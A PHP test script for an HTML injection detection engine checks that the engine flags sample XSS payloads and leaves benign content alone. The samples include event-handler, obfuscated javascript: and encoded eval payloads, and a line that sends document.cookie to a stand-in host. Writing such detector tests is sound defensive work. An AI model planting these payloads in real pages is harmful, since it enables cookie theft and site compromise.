<?php
if (PHP_SAPI !== 'cli') { exit; }
define('ABSPATH', '/tmp/');
require dirname(__DIR__) . '/includes/html-injection-engine.php';
error_reporting(E_ALL);
set_error_handler(function($level, $message) { if (error_reporting() & $level) { throw new RuntimeException($message); } return false; });
$checks = 0;
function check_html($condition, $message) { if (!$condition) { throw new RuntimeException($message); } $GLOBALS['checks']++; }
function rules_html(string $html, array $trusted = array(), bool $stored = false): array { return array_column(TK_HTML_Injection_Engine::scan($html, 'https://site.test/', $trusted, 0, $stored)['findings'], 'rule'); }

$cases = array(
    'event_handler' => array('<img src=x onerror="alert(1)">', '<svg onload="alert(1)"></svg>', '<div onclick="fetch(\'/x\')">Text</div>'),
    'executable_url' => array('<a href="java&#x0a;script:alert(1)">Go</a>', '<a href="&#106;avascript:alert(1)">Go</a>', '<form><button formaction="javascript:alert(1)">Go</button></form>'),
    'active_data_url' => array('<iframe src="data:text/html;base64,PHNjcmlwdD4="></iframe>', '<script src="data:application/javascript,alert(1)"></script>'),
    'hidden_iframe' => array('<iframe src="https://bad.test/x" style="display:none"></iframe>', '<iframe height="0" src="/tracker"></iframe>', '<iframe hidden src="https://bad.test"></iframe>'),
    'external_script' => array('<script nonce="looks-trusted" src="https://bad.test/payload.js"></script>', '<script src="//bad.test/a.js"></script>'),
    'external_iframe' => array('<iframe src="https://bad.test/embed"></iframe>'),
    'external_form' => array('<form action="https://bad.test/login"><input type=password name=password value="secret"></form>'),
    'external_base' => array('<base href="https://bad.test/">'),
    'external_meta_redirect' => array('<meta http-equiv="refresh" content="0; url=https://bad.test/path">'),
    'hidden_external_link' => array('<a style="display:none" href="https://bad.test/spam">Hidden promotion</a>'),
    'external_active_embed' => array('<object data="https://bad.test/x"></object>', '<embed src="https://bad.test/x">'),
    'encoded_execution' => array('<script nonce="valid">eval(atob("YWxlcnQoMSk="))</script>', '<script>document.write(unescape("%3Ciframe%3E"))</script>', '<script>Function(String.fromCharCode(97,98))()</script>'),
    'cookie_outbound' => array('<script>fetch("https://bad.test/capture?x="+document.cookie)</script>'),
    'script_redirect' => array('<script>location.href="https://bad.test/";</script>'),
    'dynamic_script_loader' => array('<script>let s=document.createElement("script");s.src="https://bad.test/a.js";</script>'),
);
foreach ($cases as $rule => $examples) { foreach ($examples as $html) { check_html(in_array($rule, rules_html($html), true), 'Detection missed: ' . $rule . ' / ' . $html); } }
foreach (array(
    '<p>Normal article with document.cookie and eval(atob(...)) as plain text.</p>',
    '<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>',
    '<!-- <img src=x onerror="alert(1)"><script src="https://bad.test"></script> -->',
    '<script src="/assets/app.js"></script><script src="https://site.test/app.js"></script>',
    '<script type="application/ld+json">{"description":"eval(atob(example))"}</script>',
    '<script type="application/json">{"example":"document.write(unescape(sample))"}</script>',
    '<iframe src="https://www.youtube.com/embed/example"></iframe>',
    '<form action="/contact"><input name="name"></form>',
    '<img src="data:image/png;base64,AA==">',
) as $html) { check_html(rules_html($html, array('www.youtube.com')) === array(), 'Benign content flagged: ' . $html); }

check_html(in_array('external_script', rules_html('<script src="https://cdn.good.test/app.js"></script>', array('*.good.test')), true), 'Legacy wildcard silently approved arbitrary external scripts');
check_html(in_array('external_script', rules_html('<script src="https://good.test.evil.test/a.js"></script>', array('good.test')), true), 'Suffix host spoof bypassed review');
check_html(in_array('hidden_iframe', rules_html('<iframe hidden src="https://good.test"></iframe>', array('good.test')), true), 'Trusted host suppressed a dangerous inline/hidden finding');
check_html(in_array('stored_script', rules_html('<script>alert(1)</script>', array(), true), true), 'Plain script stored in database not inventoried');
check_html(rules_html('<script type="application/ld+json">{}</script>', array(), true) === array(), 'Stored JSON-LD treated as executable');
$srcdoc = '<iframe srcdoc="&lt;script&gt;eval(atob(&quot;eA==&quot;))&lt;/script&gt;"></iframe>';
check_html(in_array('encoded_execution', rules_html($srcdoc), true), 'Nested srcdoc not inspected');
$multiline = TK_HTML_Injection_Engine::scan("<div>Normal</div>\n<img src=x onerror=alert(1)>", 'https://site.test/');
check_html($multiline['findings'][0]['line'] === 2, 'Evidence line number incorrect');
$many = TK_HTML_Injection_Engine::scan(str_repeat('<img onerror=alert(1)>', 100), 'https://site.test/');
check_html(count($many['findings']) === 40 && $many['limited'], 'Finding budget not enforced');
$large = TK_HTML_Injection_Engine::scan(str_repeat('x', TK_HTML_Injection_Engine::MAX_BYTES + 1), 'https://site.test/');
check_html($large['limited'] && !$large['findings'], 'Oversized HTML silently considered scanned');
$redacted = TK_HTML_Injection_Engine::snippet('<script nonce="secret" src="https://user:pass@bad.test/p?token=secret"></script><input value="secret">');
check_html(strpos($redacted, 'secret') === false && strpos($redacted, 'user:pass') === false, 'Evidence leaked nonce, credential, query or form value');

$html = '<img src=x onerror=alert(1)>';
$json = TK_HTML_Injection_Engine::strings(json_encode(array('builder' => array('html' => $html), 'api_token' => $html)));
check_html(count($json['values']) === 1 && $json['values'][0]['path'] === '[builder][html]' && $json['values'][0]['html'] === $html, 'JSON nested fields/secret exclusion failed');
$serialized = TK_HTML_Injection_Engine::strings(serialize(array('content' => $html, 'secret' => $html, 'nested' => array(3 => '<script>alert(2)</script>'))));
check_html(count($serialized['values']) === 2 && !$serialized['limited'], 'Serialized array content not safely extracted');
class HTML_Scan_Unsafe_Fixture { public $html = '<script>bad()</script>'; public function __wakeup() { throw new RuntimeException('Serialized object executed'); } }
$objects = TK_HTML_Injection_Engine::strings(serialize(array('object' => new HTML_Scan_Unsafe_Fixture())));
check_html(!$objects['values'] && $objects['limited'], 'Serialized objects accepted/executed');
check_html(TK_HTML_Injection_Engine::strings('a:9:{garbage')['limited'], 'Malformed serialization silently scanned');
check_html(TK_HTML_Injection_Engine::strings(str_repeat('x', TK_HTML_Injection_Engine::MAX_BYTES + 1))['limited'], 'Oversized database value accepted');
check_html(!TK_HTML_Injection_Engine::strings('A normal text value')['values'], 'Plain text treated as HTML');
check_html(TK_HTML_Injection_Engine::strings(serialize(array('inner' => array('html' => '<p>Merah 日本語</p>'))))['values'][0]['html'] === '<p>Merah 日本語</p>', 'Serialized byte lengths or Unicode corrupted');
echo 'PASS: ' . $checks . " HTML injection signature, benign content, host allowlist, nonce independence, srcdoc, safe JSON/serialization, evidence and limit checks\n";
